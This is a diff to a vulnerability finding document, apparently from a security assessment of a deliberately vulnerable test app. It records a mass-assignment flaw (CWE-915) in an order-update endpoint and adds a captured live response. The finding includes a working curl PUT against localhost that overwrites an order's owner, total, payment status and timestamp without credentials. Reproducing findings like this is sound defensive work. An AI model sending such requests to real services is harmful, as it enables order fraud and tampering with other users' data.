@@ -1,6 +1,6 @@
 # V3: Order mass assignment
 
-Baseline reference: baseline-vulnerable
+Baseline reference: baseline-vulnerable (`cb68a377f5b8cdc3b12f86883ac6fb703ef5e405`)
 Primary mapping: CWE-915: Improperly Controlled Modification of Dynamically-Managed Object Attributes
 
 ## Reproduction request
@@ -8,7 +8,7 @@ Primary mapping: CWE-915: Improperly Controlled Modification of Dynamically-Mana
 ```bash
 curl -i -X PUT http://localhost:5000/api/orders/0000000000000000000000e1 \
   -H 'Content-Type: application/json' \
-  --data '{"userId":"CUSTOMER_B","totalAmount":1,"status":"paid"}'
+  --data '{"userId":"00000000-0000-4000-8000-000000000002","totalAmount":1,"status":"paid","createdAt":"2000-01-01T00:00:00.000Z"}'
 ```
 
 ## Baseline source result
@@ -18,4 +18,16 @@ curl -i -X PUT http://localhost:5000/api/orders/0000000000000000000000e1 \
 
 Impact: The update path passes the complete request body to the persistence operation, allowing client-controlled protected attributes.
 
-This Phase 3 artifact is a reproducible source-level baseline proof. The curl request is the local HTTP reproduction recipe; live response captures are added after the affected local service is started. No live response is claimed by this artifact.
+This Phase 3 artifact is a reproducible source-level baseline proof.
+
+## Live baseline response
+
+Run from the isolated baseline checkout without credentials:
+
+```text
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+{"_id":"0000000000000000000000e1","userId":"00000000-0000-4000-8000-000000000002","totalAmount":1,"currency":"usd","paymentMethod":"card","status":"paid","createdAt":"2000-01-01T00:00:00.000Z"}
+```
+
+The complete response showed that client values changed owner, amount, status, and timestamp. All identities and order data are synthetic.
